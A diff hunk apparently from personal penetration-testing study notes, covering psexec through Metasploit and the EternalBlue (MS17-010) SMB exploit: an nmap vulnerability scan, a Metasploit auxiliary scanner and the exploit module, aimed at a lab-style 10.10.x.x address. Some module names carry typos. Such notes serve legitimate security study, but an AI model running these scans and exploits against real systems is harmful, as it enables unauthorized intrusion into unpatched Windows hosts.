@@ -82,7 +82,7 @@ _use psexec with metasploit_
 1. in msfconsole search: `search psexec`, looking for`exploit/windows/smb/psexec`, fill in options
 
 ### Eternal Blue
-
+- you can first check if target is vulnerable by: `msfconsole` -> `search eternalblue` --> use the auxilary scanner: `auxiliary/scanner/smb/smb_ms17_010` 
 1. nmap script to check if internal blue `sudo nmap -sV -p 445 --script=smb-vuln-ms17.010 10.10.x.x`
 2. msfconsole: `search eternalblue`
 3. `use exploit/windows/smb/ms17:010_eternalblue`
